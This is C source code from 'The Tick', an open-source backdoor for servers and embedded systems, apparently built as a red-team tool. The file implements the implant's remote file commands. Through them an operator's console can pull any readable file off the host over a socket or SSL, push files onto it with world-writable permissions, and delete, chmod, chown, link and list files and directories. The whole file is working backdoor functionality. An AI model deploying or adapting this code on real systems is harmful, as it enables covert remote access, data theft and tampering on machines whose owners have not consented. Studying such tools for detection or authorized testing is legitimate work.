/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

// Try to get the definitions of lstat() and readlink() included.
// We must do this before any other headers are included.
// If in the future this fails for some weird platform,
// we could alias lstat() to stat() here instead.
#ifndef _WIN32
# define _BSD_SOURCE
# define _DEFAULT_SOURCE
# define _XOPEN_SOURCE 500
# define _POSIX_C_SOURCE 200112L
# define __USE_XOPEN_EXTENDED
# include <sys/stat.h>
#endif

#ifdef _WIN32

// Used in the time conversion routine.
#define WINDOWS_TICK 10000000
#define SEC_TO_UNIX_EPOCH 11644473600LL

// Used in the emulation of stat().
#define	S_IFMT      0170000
#define	S_IFDIR     0040000
#define	S_IFCHR     0020000
#define	S_IFBLK     0060000
#define	S_IFREG     0100000
#define	S_IFIFO     0010000
#define	S_IFLNK     0120000
#define	S_IFSOCK    0140000
#define	S_ISUID     04000
#define	S_ISGID     02000
#define	S_ISVTX     01000
#define	S_IREAD     0400
#define	S_IWRITE    0200
#define	S_IEXEC     0100

// Used to create symlinks.
#ifndef SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE
#define SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE 2
#endif

#endif

#include "file.h"

#include "stream.h"

//////////////////////////////////////////////////////////////////////////////
// Basic file commands
// Added since v0.1

void real_file_pull(Parser *p, size_t size, off_t offset);
void real_file_push(Parser *p, off_t offset, int is_new);

// Implements the "pull" command.
void do_file_pull(Parser *p)
{
    real_file_pull(p, 0, 0);
}

// Helper function for reading a file.
// This is shared by the "pull" and "read" commands.
void real_file_pull(Parser *p, size_t size, off_t offset)
{
    // Get the filename into the parser's internal buffer.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *filename = p->buffer;

    // Make sure we have read access to the file.
    if (access(filename, F_OK) == -1) {
        LOG("Cannot find %s\n", filename);
        parser_error(p, "file not found");
        return;
    }
    if (access(filename, R_OK) == -1) {
        LOG("Cannot read %s\n", filename);
        parser_error(p, "file not readable");
        return;
    }

    // Open the file.
    int file = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // If the size to read is 0, bring the whole file.
    if (size == 0) {
        struct stat info;
        info.st_size = 0;
        stat(filename, &info);
        size = info.st_size;
    }

    // Make sure the file isn't empty.
    if (size == 0) {
        LOG("Cannot stat or empty file %s\n", filename);
        parser_error(p, "cannot stat or empty file");
        close(file);
        return;
    }

    // Make sure the file isn't too big to send.
    if (size > (off_t) 0x7FFFFFFF) {
        LOG("File too large %s\n", filename);
        parser_error(p, "file too large");
        close(file);
        return;
    }

    // Move the file pointer to the desired offset.
    if (offset != 0 && lseek(file, offset, SEEK_SET) < 0) {
        LOG("Error seeking offset %ld in %s\n", (long int) offset, filename);
        parser_error(p, "cannot seek");
        close(file);
        return;
    }

    // Send the file in the response.
    // Close the connection if something goes wrong at this point.
    LOG("Reading file %s\n", filename);
    parser_begin_response(p, CMD_STATUS_OK, size);
    int success = 0;
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        success = copy_stream(file, STREAM_FD, (STREAM_T) &p->ssl, STREAM_SSL, size);
    } else {
        success = copy_stream(file, STREAM_FD, p->fd, STREAM_SOCKET, size);
    }
#else
    success = copy_stream(file, STREAM_FD, p->fd, STREAM_SOCKET, size);
#endif
    if (success < 0) {
        parser_close(p);
        LOG("Error sending file (%ld bytes)\n", (long int) size);
    } else {
        LOG("Success (%ld bytes)\n", (long int) size);
    }
    close(file);
}

// Implements the "push" command.
void do_file_push(Parser *p)
{
    real_file_push(p, 0, 1);
}

// Helper function for writing a file.
// This is shared by the "push" and "write" commands.
void real_file_push(Parser *p, off_t offset, int is_new)
{
    int file = -1;
    int success = -1;
    char *filename = p->buffer;

    // Get the filename into the parser's internal buffer.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Open the file for writing.
    // If the file is new, fix the mode (in case umask is messing with us).
    if (is_new) {
        file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_BINARY | O_SEQUENTIAL, 0777);
        chmod(filename, 0777);
    } else {
        file = open(filename, O_WRONLY | O_SYNC | O_BINARY | O_SEQUENTIAL);
    }
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Move the file pointer to the desired offset.
    if (offset != 0 && lseek(file, offset, SEEK_SET) < 0) {
        LOG("Error seeking offset %ld in %s\n", (long int) offset, filename);
        parser_error(p, "cannot seek");
        close(file);
        return;
    }

    // Save the file data as it comes from the socket.
    LOG("Writing file %s\n", filename);
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        success = copy_stream((STREAM_T) &p->ssl, STREAM_SSL, file, STREAM_FD, p->header.data_len);
    } else {
        success = copy_stream(p->fd, STREAM_SOCKET, file, STREAM_FD, p->header.data_len);
    }
#else
    success = copy_stream(p->fd, STREAM_SOCKET, file, STREAM_FD, p->header.data_len);
#endif

    // Flush the file cache to make sure the data is written to disk.
    // No need to check for errors on this operation.
#ifdef _WIN32
    FlushFileBuffers((HANDLE) _get_osfhandle(file));
#else
    fsync(file);
#endif

    // Close the file and return.
    close(file);
    if (success < 0) {
        LOG("Error receiving file (%d bytes)\n", p->header.data_len);
        parser_error(p, "failed to write file");
        parser_close(p);
    } else {
        LOG("Success (%d bytes)\n", p->header.data_len);
        parser_ok(p);
    }
    p->header.data_len = 0;     // Make sure to reset this counter!
}

// Implements the "rm" command.
// Also be used by the FUSE layer since v0.2.
void do_file_unlink(Parser *p)
{
    char *filename = p->buffer;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Delete the file.
    if (unlink(filename) < 0) {
        LOG("Error deleting file %s\n", filename);
        parser_error(p, "could not delete");
    } else {
        LOG("Deleted file %s\n", filename);
        parser_ok(p);
    }
}

// Implements the "chmod" command.
// Also be used by the FUSE layer since v0.2.
void do_file_chmod(Parser *p)
{
    char *filename = p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    if (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Chmod the file.
    if (chmod(filename, mode) < 0) {
        LOG("Error changing file mode to %03o %s\n", mode, filename);
        parser_error(p, "could not chmod");
    } else {
        LOG("Changed file mode to %03o %s\n", mode, filename);
        parser_ok(p);
    }
}

//////////////////////////////////////////////////////////////////////////////
// FUSE methods
// Added since v0.2

void do_file_open(Parser *p)
{
    char *filename = p->buffer;
    uint16_t flags = 0;
    uint16_t mode = 0;
    uint16_t error = 0;

    // First two bytes are the open flags in network byte order.
    // Second two bytes are the mode flags in network byte order.
    // The following bytes are the filename.
    if (
        (p->header.cmd_len < sizeof(flags) + sizeof(mode) + 2) ||
        (parser_recv_block(p, (char *) &flags, sizeof(flags)) < 0) ||
        (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0)
    ) {
        LOG("Malformed open command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - (sizeof(flags) + sizeof(mode));
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    flags = ntohs(flags);
    mode = ntohs(mode);

    // Open the file and close it immediately.
    // We don't need to preserve the open file descriptor, since each function will
    // just open the file again. This is why we only support a subset of flags,
    // we don't want any unintended consequences from this.
    if (flags != (flags & (O_RDONLY|O_WRONLY|O_RDWR|O_CREAT|O_SYNC|O_TRUNC))) {
        error = EINVAL;
    } else {
        int fd = open(filename, flags, mode);
        if (fd < 0) {
            error = errno;
        } else {
            close(fd);
            error = 0;
        }
    }

    // Return 0 on success or the error code or 0 on failure.
    // This plays better with FUSE since we can return a proper
    // error code to it rather than having to parse strings.
    LOG("Open call on file %s, error code %d\n", filename, error);
    error = htons(error);
    parser_begin_response(p, CMD_STATUS_OK, 2);
    parser_send_block(p, (char *) &error, 2);
}

void do_file_read(Parser *p)
{
    uint32_t size = 0;
    uint32_t offset = 0;

    // First four bytes are the size in network byte order.
    // Second four bytes are the offset in network byte order.
    // The following bytes are the filename.
    if (
        (p->header.cmd_len < sizeof(size) + sizeof(offset) + 2) ||
        (parser_recv_block(p, (char *) &size, sizeof(size)) < 0) ||
        (parser_recv_block(p, (char *) &offset, sizeof(offset)) < 0)
    ) {
        LOG("Malformed open command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - (sizeof(size) + sizeof(offset));
    size = ntohl(size);
    offset = ntohl(offset);

    // Respond with the requested file contents.
    real_file_pull(p, size, offset);
}

void do_file_write(Parser *p)
{
    uint32_t offset = 0;

    // First four bytes are the offset in network byte order.
    // The following bytes are the filename.
    if (
        (p->header.cmd_len < sizeof(offset) + 2) ||
        (parser_recv_block(p, (char *) &offset, sizeof(offset)) < 0)
    ) {
        LOG("Malformed open command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - (sizeof(offset));
    offset = ntohl(offset);

    // Write the incoming file contents to the file.
    real_file_push(p, offset, 0);
}

void do_file_stat(Parser *p)
{
    char *filename = p->buffer;
    RESP_FILE_STAT mystat;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

#if defined (_WIN32)

    // On Windows most of the fields don't make sense.
    // We'll just leave them as 0.
    memset(&mystat, 0, sizeof(mystat));

    // First, find out what type of file this is.
    // It could be a directory or whatever.
    DWORD dwAttrib = GetFileAttributesA(filename);
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        LOG("Cannot stat file: %s\n", filename);
        parser_error(p, "cannot stat");
        return;
    }

    // Translate the mode attributes. Very, very roughly.
    if (dwAttrib & (FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_REPARSE_POINT)) {
        mystat.mode = 0777;
        if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
            mystat.mode |= S_IFDIR;
        }
        if (dwAttrib & FILE_ATTRIBUTE_REPARSE_POINT) {
            mystat.mode |= S_IFLNK;
        }
    } else {
        if (dwAttrib & (FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM)) {
            mystat.mode = 0444;
        } else {
            mystat.mode = 0666;
        }
        size_t len = strlen(filename);
        if (len > 4 && stricmp(&filename[len-4], ".exe") == 0) {
            mystat.mode |= 0111;
        }
    }

    // If it's a file, we need an open file handle.
    if (!(dwAttrib & (FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_DEVICE))) {
        HANDLE hFile = CreateFileA(
            filename, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {

            // File size.
            LARGE_INTEGER size;
            if (GetFileSizeEx(hFile, &size)) {
                mystat.size = size.QuadPart;
            }

            // File times. We need to convert them from Windows ticks to Unix epoch.
            // See: https://stackoverflow.com/a/6161842/426293
            FILETIME ft_creation_time;
            FILETIME ft_last_access_time;
            FILETIME ft_last_write_time;
            if (GetFileTime(hFile, &ft_creation_time, &ft_last_access_time, &ft_last_write_time)) {
                ULARGE_INTEGER ui_creation_time;
                ULARGE_INTEGER ui_last_access_time;
                ULARGE_INTEGER ui_last_write_time;
                ui_creation_time.LowPart  = ft_creation_time.dwLowDateTime;
                ui_creation_time.HighPart = ft_creation_time.dwHighDateTime;
                ui_last_access_time.LowPart  = ft_last_access_time.dwLowDateTime;
                ui_last_access_time.HighPart = ft_last_access_time.dwHighDateTime;
                ui_last_write_time.LowPart  = ft_last_write_time.dwLowDateTime;
                ui_last_write_time.HighPart = ft_last_write_time.dwHighDateTime;
                mystat.ctime = (ui_creation_time.QuadPart / WINDOWS_TICK) - SEC_TO_UNIX_EPOCH;
                mystat.atime = (ui_last_access_time.QuadPart / WINDOWS_TICK) - SEC_TO_UNIX_EPOCH;
                mystat.mtime = (ui_last_write_time.QuadPart / WINDOWS_TICK) - SEC_TO_UNIX_EPOCH;
            }

            // We're done with the handle.
            CloseHandle(hFile);
        }
    }

#else

    // Stat the file.
    int success = 0;
    struct stat st;
    memset(&st, 0, sizeof(st));
    if (lstat(filename, &st) < 0) {
        LOG("Cannot stat file: %s\n", filename);
        parser_error(p, "cannot stat");
        return;
    }

    // Convert the native stat structure to RESP_FILE_STAT.
    // We need this to ensure it stays the same across platforms.
    // All values will be converted to network byte size order.
    // (Hopefully the values themselves are more or less portable...)
    memset(&mystat, 0, sizeof(mystat));
    mystat.dev = htonll(st.st_dev);
    mystat.ino = htonll(st.st_ino);
    mystat.mode = htonll(st.st_mode);
    mystat.nlink = htonll(st.st_nlink);
    mystat.uid = htonll(st.st_uid);
    mystat.gid = htonll(st.st_gid);
    mystat.rdev = htonll(st.st_rdev);
    mystat.size = htonll(st.st_size);
    mystat.atime = htonll(st.st_atime);
    mystat.mtime = htonll(st.st_mtime);
    mystat.ctime = htonll(st.st_ctime);

#endif

    LOG("Stat call on file %s\n", filename);
    parser_begin_response(p, CMD_STATUS_OK, sizeof(mystat));
    parser_send_block(p, (char *) &mystat, sizeof(mystat));
}

// This one is tricky because we need to count the number of entries first,
// then send the entries later. We're inevitably going to have some race
// conditions. The "solution" here will be to, if we miss the calculation
// somehow, just skip some extra entries if we run out of buffer space for
// the new filenames. Far from perfect, but it is what it is.
void do_file_readdir(Parser *p)
{
    // Get the pathname (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *pathname = p->buffer;
    unsigned int count = 0;
    size_t resp_size = 0;

    LOG("Listing directory: %s\n", pathname);

#ifdef _WIN32
    WIN32_FIND_DATAA fd;

    // Iterate once to calculate the size of the response.
    memset(&fd, 0, sizeof(fd));
    HANDLE hFind = FindFirstFileA(pathname, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        LOG("Error listing directory: %s\n", pathname);
        parser_error(p, "cannot opendir");
        return;
    }
    for (;;) {
        resp_size += strlen(fd.cFileName) + 1;
        count++;
        if (FindNextFile(hFind, &fd) == 0) break;
    }
    FindClose(hFind);

    // Iterate again to send the filenames.
    // Stop early if we ran out of space in the response.
    memset(&fd, 0, sizeof(fd));
    hFind = FindFirstFileA(pathname, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        LOG("Error listing directory: %s\n", pathname);
        parser_error(p, "cannot opendir");
        return;
    }
    parser_begin_response(p, CMD_STATUS_OK, resp_size);
    while (resp_size > 0) {
        size_t len = strlen(fd.cFileName) + 1;
        if (resp_size >= len) {
            parser_send_block(p, fd.cFileName, len);
            resp_size -= len;
        }
        if (FindNextFile(hFind, &fd) == 0) break;
    }
    FindClose(hFind);

#else

    // Iterate once to calculate the size of the response.
    DIR *dir = opendir(pathname);
    if (dir == NULL) {
        LOG("Error listing directory: %s\n", pathname);
        parser_error(p, "cannot opendir");
        return;
    }
    for (;;) {
        struct dirent *entry = readdir(dir);
        if (entry == NULL) break;
        resp_size += strlen(entry->d_name) + 1;
        count++;
    }
    closedir(dir);

    // Iterate again to send the filenames.
    // Stop early if we ran out of space in the response.
    dir = opendir(pathname);
    if (dir == NULL) {
        LOG("Error listing directory: %s\n", pathname);
        parser_error(p, "cannot opendir");
        return;
    }
    parser_begin_response(p, CMD_STATUS_OK, resp_size);
    for (;;) {
        struct dirent *entry = readdir(dir);
        if (entry == NULL) break;
        size_t len = strlen(entry->d_name) + 1;
        if (resp_size >= len) {
            parser_send_block(p, entry->d_name, len);
            resp_size -= len;
        }
    }
    closedir(dir);

#endif

    // Pad the response if needed.
    if (resp_size > 0) {
        char c = 0;
        parser_send_block(p, &c, 1);
        resp_size--;
    }

    // Log the event.
    LOG("Found %d files\n", count);
}

void do_file_readlink(Parser *p)
{
    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *filename = p->buffer;
    LOG("Resolving symlink: %s\n", filename);

#ifdef _WIN32

    // On Windows we don't have a readlink() equivalent.
    // But we do have a realpath() equivalent.
    // Sadly this only works for files.
    HANDLE hFile = CreateFileA(
            filename, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("Error resolving symlink: %s\n", filename);
        parser_error(p, "cannot readlink");
        return;
    }

    // Hack: we use the input buffer as the output buffer.
    memset(p->buffer, 0, sizeof(p->buffer));
    size_t len = GetFinalPathNameByHandleA(hFile, p->buffer, sizeof(p->buffer), 0);
    CloseHandle(hFile);

    // Check for error condition.
    if (len == 0 || len > sizeof(p->buffer)) {
        LOG("Error resolving symlink: %s\n", filename);
        parser_error(p, "cannot readlink");
        return;
    }

    // Fix the size on some Windows versions.
    len = strlen(p->buffer) + 1;

#else

    // Hack: we use the input buffer as the output buffer.
    ssize_t len = readlink(filename, p->buffer, sizeof(p->buffer) - 1);
    p->buffer[len] = 0;

#endif
    LOG("Resolved symlink to: %s\n", p->buffer);
    len++;
    parser_begin_response(p, CMD_STATUS_OK, len);
    parser_send_block(p, p->buffer, len);
}

void do_file_symlink(Parser *p)
{
    char target[256];
    char linkname[256];

    // Get the target filename (first argument).
    if (parser_get_first_arg(p) < 0 || strlen(p->buffer) > (sizeof(target) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(target, p->buffer, sizeof(target) - 1);

    // Get the linkname filename (second argument).
    if (parser_get_second_arg(p) < 0 || strlen(p->buffer) > (sizeof(linkname) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(linkname, p->buffer, sizeof(linkname) - 1);

#ifdef _WIN32

    // We have to tell the Win32 API if it's a directory or not.
    // On Unix that's not necessary.
    DWORD dwAttrib = GetFileAttributesA(target);
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        LOG("Cannot create symlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        return;
    }

    // Create the symlink.
    if (CreateSymbolicLinkA(linkname, target,
        (dwAttrib & FILE_ATTRIBUTE_DIRECTORY ? SYMBOLIC_LINK_FLAG_DIRECTORY : 0) ||
        SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE) == 0)
    {
        LOG("Cannot create symlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        return;
    }

#else

    // Create the symlink.
    if (symlink(target, linkname) < 0) {
        LOG("Cannot create symlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        return;
    }

#endif

    // Success.
    LOG("Created symlink %s -> %s\n", linkname, target);
    parser_ok(p);
}

void do_file_link(Parser *p)
{
    char target[256];
    char linkname[256];

    // Get the target filename (first argument).
    if (parser_get_first_arg(p) < 0 || strlen(p->buffer) > (sizeof(target) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(target, p->buffer, sizeof(target) - 1);

    // Get the linkname filename (second argument).
    if (parser_get_second_arg(p) < 0 || strlen(p->buffer) > (sizeof(linkname) - 1)) {
        parser_error(p, "file name too long");
        return;
    }
    strncpy(linkname, p->buffer, sizeof(linkname) - 1);

#ifdef _WIN32

    // Create the hardlink.
    if (CreateHardLinkA(linkname, target, NULL) == 0)
    {
        LOG("Cannot create hardlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        return;
    }

#else

    // Create the hardlink.
    if (link(target, linkname) < 0) {
        LOG("Cannot create hardlink %s -> %s\n", linkname, target);
        parser_error(p, "cannot link");
        return;
    }

#endif

    // Success.
    LOG("Created hardlink %s -> %s\n", linkname, target);
    parser_ok(p);
}

void do_file_rmdir(Parser *p)
{
    char *pathname = p->buffer;

    // Get the pathname (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Delete the directory.
    if (rmdir(pathname) < 0) {
        LOG("Error deleting directory %s\n", pathname);
        parser_error(p, "could not delete");
    } else {
        LOG("Deleted directory %s\n", pathname);
        parser_ok(p);
    }
}

void do_file_mkdir(Parser *p)
{
    char *pathname = p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    if (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the pathname.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Create the directory.
    int success = 0;
#ifdef _WIN32
    success = mkdir(pathname);
#else
    success = mkdir(pathname, mode);
#endif
    if (success < 0) {
        LOG("Error creating directory %s\n", pathname);
        parser_error(p, "could not mkdir");
    } else {
        LOG("Created directory %s\n", pathname);
        parser_ok(p);
    }
}

#ifdef _WIN32
void do_file_chown(Parser *p)
{
    parser_error(p, "not implemented");
}
#else
void do_file_chown(Parser *p)
{
    char *filename = p->buffer;
    uint64_t uid = 0;
    uint64_t gid = 0;

    // First 16 bytes are the uid and gid in network byte order.
    if ((p->header.cmd_len < 16) &&
        (parser_recv_block(p, (char *) &uid, 8) < 0) &&
        (parser_recv_block(p, (char *) &gid, 8) < 0)
    )
    {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - 16;
    uid = ntohl(uid);
    gid = ntohl(gid);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Chown the file.
    if (chown(filename, uid, gid) < 0) {
        LOG("Error changing file ownership to %ld:%ld for: %s\n", (long int) uid, (long int) gid, filename);
        parser_error(p, "could not chown");
    } else {
        LOG("Changed file ownership to %ld:%ld for: %s\n", (long int) uid, (long int) gid, filename);
        parser_ok(p);
    }
}
#endif

void do_file_access(Parser *p)
{
    char *filename = p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    if (parser_recv_block(p, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
        return;
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Test access to the file.
    if (access(filename, mode) < 0) {
        LOG("Access denied to file %s\n", filename);
        parser_error(p, NULL);
    } else {
        LOG("Access granted to file %s\n", filename);
        parser_ok(p);
    }
}

void do_file_statvfs(Parser *p)
{
    // Get the pathname (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }
    char *pathname = p->buffer;

    // Zero out the structure, since the default value for all fields is 0.
    RESP_FILE_STATVFS vfs;
    memset(&vfs, 0, sizeof(vfs));

#ifdef _WIN32

    // We don't have this call on Windows so we emulate it.
    // Let's stat by hardcoding some values.
    vfs.f_type = htonll(0x5346544e);    // NTFS_SB_MAGIC
    vfs.f_namelen = htonll(MAX_PATH);

    // Get the free disk space statistics and translate the values.
    // Some values are pretty much made up, but what else can we do.
    DWORD dwSectorsPerCluster;
    DWORD dwBytesPerSector;
    DWORD dwNumberOfFreeClusters;
    DWORD dwTotalNumberOfClusters;
    if (GetDiskFreeSpaceA(pathname,
            &dwSectorsPerCluster,
            &dwBytesPerSector,
            &dwNumberOfFreeClusters,
            &dwTotalNumberOfClusters) == 0)
    {
        vfs.f_bsize = htonll((uint64_t) dwSectorsPerCluster * (uint64_t) dwBytesPerSector);
        vfs.f_blocks = htonll(dwTotalNumberOfClusters);
        vfs.f_bfree = htonll(dwNumberOfFreeClusters);
        vfs.f_files = htonll(dwTotalNumberOfClusters);  // not really :(
        vfs.f_ffree = htonll(dwNumberOfFreeClusters);   // not really :(
    }

    // Get the volume information and translate the values.
    PathStripToRootA(pathname);
    DWORD dwVolumeSerialNumber;
    DWORD dwMaximumComponentLength;
    DWORD dwFileSystemFlags;
    if (GetVolumeInformationA(
            pathname, NULL, 0, &dwVolumeSerialNumber,
            &dwMaximumComponentLength, &dwFileSystemFlags, NULL, 0))
    {
        memcpy(&vfs.f_fsid, &dwVolumeSerialNumber, sizeof(dwVolumeSerialNumber));
        vfs.f_namelen = htonll(dwMaximumComponentLength);
        if (dwFileSystemFlags & FILE_READ_ONLY_VOLUME) {
            vfs.f_flags = htonll(1);    // ST_RDONLY
        }
    }

#else

    // Do the actual syscall.
    struct statvfs svfs;
    if (statvfs(pathname, &svfs) < 0) {
        LOG("Error on stat call to: %s\n", pathname);
        parser_error(p, "cannot statvfs");
        return;
    }

    // Now translate the results.
    vfs.f_bsize = htonll(svfs.f_bsize);
    vfs.f_blocks = htonll(svfs.f_blocks);
    vfs.f_bfree = htonll(svfs.f_bfree);
    vfs.f_bavail = htonll(svfs.f_bavail);
    vfs.f_files = htonll(svfs.f_files);
    vfs.f_ffree = htonll(svfs.f_ffree);
#ifdef __ANDROID__
    //vfs.f_type = htonll(svfs.f_type); // not present in all versions
#ifdef _STATFS_F_NAMELEN
    vfs.f_namelen = htonll(svfs.f_namelen);
#endif
#ifdef _STATFS_F_FRSIZE
    vfs.f_frsize = htonll(svfs.f_frsize);
#endif
#ifdef _STATFS_F_FLAGS
    vfs.f_namelen = htonll(svfs.f_flags);
    #endif
#endif
    memcpy(&vfs.f_fsid, &svfs.f_fsid, sizeof(svfs.f_fsid));

#endif

    // Send back this structure to the console.
    LOG("Stat call to: %s\n", pathname);
    parser_begin_response(p, CMD_STATUS_OK, sizeof(vfs));
    parser_send_block(p, (char *) &vfs, sizeof(vfs));
}
